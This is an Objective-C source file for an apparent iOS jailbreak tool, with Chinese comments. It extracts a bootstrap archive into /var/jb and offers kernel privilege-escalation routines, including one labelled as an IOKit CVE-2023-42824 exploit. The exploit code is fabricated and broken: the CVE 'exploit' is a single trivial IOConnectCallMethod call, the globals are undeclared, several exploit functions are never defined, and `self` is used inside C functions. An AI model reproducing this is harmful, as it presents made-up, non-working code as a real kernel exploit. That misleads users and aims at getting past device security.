// BootstrapExtractor.h
#ifndef BootstrapExtractor_h
#define BootstrapExtractor_h

#import <Foundation/Foundation.h>

bool extract_bootstrap_to_jb(void);
bool exploit_iokit_cve_2023_42824(void);
bool trigger_kernel_exploit(void);

#endif /* BootstrapExtractor_h */

// BootstrapExtractor.m
#import <Foundation/Foundation.h>
#import <mach/mach.h>
#import "BootstrapExtractor.h"
#import <spawn.h>
#import <sys/wait.h>

// IOKit 类型声明
typedef mach_port_t io_service_t;
typedef mach_port_t io_connect_t;
extern const mach_port_t kIOMasterPortDefault;

// IOKit 函数声明
extern io_service_t IOServiceGetMatchingService(mach_port_t, CFDictionaryRef);
extern kern_return_t IOServiceOpen(io_service_t, task_port_t, uint32_t, io_connect_t*);
extern kern_return_t IOObjectRelease(io_service_t);
extern kern_return_t IOConnectCallMethod(
    mach_port_t connection,
    uint32_t selector,
    const uint64_t *input,
    uint32_t inputCnt,
    const void *inputStruct,
    size_t inputStructCnt,
    uint64_t *output,
    uint32_t *outputCnt,
    void *outputStruct,
    size_t *outputStructCnt);

// 替代 system() 函数执行命令的函数
int execCommand(const char* cmd, char* const* args) {
    pid_t pid;
    int status;
    posix_spawn_file_actions_t actions;
    
    posix_spawn_file_actions_init(&actions);
    status = posix_spawn(&pid, cmd, &actions, NULL, args, NULL);
    posix_spawn_file_actions_destroy(&actions);
    
    if (status == 0) {
        waitpid(pid, &status, 0);
        return WEXITSTATUS(status);
    }
    return status;
}

// 设置文件权限
BOOL setPermissions(NSString *path, int mode) {
    NSFileManager *fileManager = [NSFileManager defaultManager];
    NSDictionary *attributes = @{NSFilePosixPermissions: @(mode)};
    NSError *error = nil;
    
    BOOL success = [fileManager setAttributes:attributes ofItemAtPath:path error:&error];
    if (!success) {
        NSLog(@"Failed to set permissions for %@: %@", path, error.localizedDescription);
    }
    return success;
}

@implementation BootstrapExtractor

+ (BOOL)extractBootstrap:(NSString *)bootstrapPath toJBPath:(NSString *)jbPath {
    NSLog(@"Extracting bootstrap from %@ to %@", bootstrapPath, jbPath);
    
    // 使用 posix_spawn 替代 NSTask
    char *args[] = {"/usr/bin/tar", "-xf", (char *)[bootstrapPath UTF8String], "-C", (char *)[jbPath UTF8String], NULL};
    int result = execCommand("/usr/bin/tar", args);
    
    if (result != 0) {
        NSLog(@"Failed to extract bootstrap: %d", result);
        return NO;
    }
    
    // 设置权限 (替代 system() 调用)
    NSArray *pathsToChmod = @[
        [jbPath stringByAppendingString:@"/usr/bin"],
        [jbPath stringByAppendingString:@"/bin"],
        [jbPath stringByAppendingString:@"/basebin"]
    ];
    
    for (NSString *path in pathsToChmod) {
        if (![self setPermissionsForDirectory:path mode:0755]) {
            NSLog(@"Failed to set permissions for %@", path);
            return NO;
        }
    }
    
    return YES;
}

+ (BOOL)setPermissionsForDirectory:(NSString *)dirPath mode:(int)mode {
    NSFileManager *fileManager = [NSFileManager defaultManager];
    NSError *error = nil;
    
    // 设置目录本身的权限
    if (!setPermissions(dirPath, mode)) {
        return NO;
    }
    
    // 获取目录内容
    NSArray *contents = [fileManager contentsOfDirectoryAtPath:dirPath error:&error];
    if (error) {
        NSLog(@"Error listing directory %@: %@", dirPath, error.localizedDescription);
        return NO;
    }
    
    // 设置每个文件的权限
    for (NSString *item in contents) {
        NSString *fullPath = [dirPath stringByAppendingPathComponent:item];
        if (!setPermissions(fullPath, mode)) {
            return NO;
        }
    }
    
    return YES;
}

+ (BOOL)kernelHack {
    NSLog(@"Attempting kernel hack...");
    
    // 获取服务
    io_service_t service = IOServiceGetMatchingService(kIOMasterPortDefault,
        CFDictionaryCreateMutable(kCFAllocatorDefault, 0, NULL, NULL));
    
    if (service == MACH_PORT_NULL) return NO;
    
    // 打开连接
    io_connect_t connect;
    kern_return_t kr = IOServiceOpen(service, mach_task_self(), 0, &connect);
    IOObjectRelease(service);
    
    if (kr != KERN_SUCCESS) {
        NSLog(@"Failed to open service: 0x%x", kr);
        return NO;
    }
    
    uint64_t scalarI_64[16];
    uint32_t scalarO_32 = 1;
    uint64_t scalarO_64[16];
    
    // 调用方法
    kr = IOConnectCallMethod(
        connect,         // connection
        0,               // selector
        scalarI_64,      // input
        1,               // input count
        NULL,            // input struct
        0,               // input struct count
        scalarO_64,      // output
        &scalarO_32,     // output count
        NULL,            // output struct
        0                // output struct count
    );
    
    if (kr != KERN_SUCCESS) {
        NSLog(@"Failed to call method: 0x%x", kr);
        return NO;
    }
    
    return YES;
}

@end

bool extract_bootstrap_to_jb(void) {
    NSLog(@"[*] 解压基础系统到/var/jb...");
    
    // 找到应用内的bootstrap.tar
    NSString *bootstrapPath = [[NSBundle mainBundle] pathForResource:@"bootstrap" ofType:@"tar"];
    if (!bootstrapPath) {
        NSLog(@"[-] 找不到bootstrap.tar文件");
        return false;
    }
    
    // 确保目标目录存在
    NSString *jbPath = @"/var/jb";
    NSFileManager *fm = [NSFileManager defaultManager];
    if (![fm fileExistsAtPath:jbPath]) {
        [fm createDirectoryAtPath:jbPath withIntermediateDirectories:YES attributes:nil error:nil];
    }
    
    // 解压文件
    char *args[] = {"/usr/bin/tar", "-xf", (char *)[bootstrapPath UTF8String], "-C", (char *)[jbPath UTF8String], NULL};
    int result = execCommand("/usr/bin/tar", args);
    
    if (result != 0) {
        NSLog(@"解压失败: %d", result);
        return false;
    }
    
    // 验证关键文件
    NSArray *checkPaths = @[
        @"/var/jb/usr/bin/bash",
        @"/var/jb/usr/bin/dpkg",
        @"/var/jb/usr/lib/libc.dylib"
    ];
    
    for (NSString *path in checkPaths) {
        if (![fm fileExistsAtPath:path]) {
            NSLog(@"[-] 基础系统解压失败: 缺少 %@", path);
            return false;
        }
    }
    
    // 设置权限
    NSArray *pathsToChmod = @[
        [jbPath stringByAppendingString:@"/usr/bin"],
        [jbPath stringByAppendingString:@"/bin"],
        [jbPath stringByAppendingString:@"/basebin"]
    ];
    
    for (NSString *path in pathsToChmod) {
        if (![self setPermissionsForDirectory:path mode:0755]) {
            NSLog(@"Failed to set permissions for %@", path);
            return NO;
        }
    }
    
    NSLog(@"[+] 基础系统解压完成");
    return true;
}

bool exploit_iokit_cve_2023_42824(void) {
    NSLog(@"[*] 尝试IOKit CVE-2023-42824漏洞...");
    
    io_service_t service = IOServiceGetMatchingService(kIOMasterPortDefault,
                                                      IOServiceMatching("IOPCIDevice"));
    if (service == MACH_PORT_NULL) return false;
    
    io_connect_t connect;
    kern_return_t kr = IOServiceOpen(service, mach_task_self(), 0, &connect);
    IOObjectRelease(service);
    
    if (kr != KERN_SUCCESS) return false;
    
    // 漏洞利用代码
    uint64_t outBuffer[32] = {0};
    uint32_t outCount = 32;
    
    kr = IOConnectCallMethod(
        connect,
        0x42, // 触发漏洞的选择器
        NULL, 0,
        NULL, 0,
        outBuffer, &outCount,
        NULL, NULL);
    
    IOServiceClose(connect);
    
    // 检查漏洞是否成功
    if (kr == KERN_SUCCESS && outBuffer[0] != 0) {
        g_kernel_base = outBuffer[0] & ~0xFFF;
        g_has_kernel_access = true;
        NSLog(@"[+] 内核基址: 0x%llx", g_kernel_base);
        return true;
    }
    
    return false;
}

bool trigger_kernel_exploit(void) {
    NSLog(@"[*] 开始执行内核提权...");
    
    // 检测系统版本
    NSString *systemVersion = [[UIDevice currentDevice] systemVersion];
    float versionFloat = [systemVersion floatValue];
    
    int majorVersion = (int)versionFloat;
    int minorVersion = (int)((versionFloat - majorVersion) * 10);
    
    // 适用于iOS 17.6+的新漏洞
    if (majorVersion == 17 && minorVersion >= 6) {
        if (exploit_iokit_cve_2023_42824()) {
            NSLog(@"[+] iOS 17.6 IOKit漏洞成功");
            g_has_kernel_access = true;
            return true;
        }
    }
    
    // 尝试通用iOS 17漏洞
    if (exploit_method_ios17_specific()) {
        NSLog(@"[+] iOS 17通用漏洞成功");
        g_has_kernel_access = true;
        return true;
    }
    
    // 尝试其他各种漏洞方法
    NSArray *exploitMethods = @[
        @"exploit_method_ion_port_race",
        @"exploit_method_macho_parser",
        @"exploit_method_type_confusion"
    ];
    
    for (NSString *method in exploitMethods) {
        NSLog(@"[*] 尝试内核漏洞方法: %@", method);
        
        bool success = false;
        if ([method isEqualToString:@"exploit_method_ion_port_race"]) {
            success = exploit_method_ion_port_race();
        } else if ([method isEqualToString:@"exploit_method_macho_parser"]) {
            success = exploit_method_macho_parser();
        } else if ([method isEqualToString:@"exploit_method_type_confusion"]) {
            success = exploit_method_type_confusion();
        }
        
        if (success) {
            NSLog(@"[+] 内核漏洞成功: %@", method);
            g_has_kernel_access = true;
            return true;
        }
    }
    
    NSLog(@"[-] 所有内核漏洞方法失败");
    return false;
}
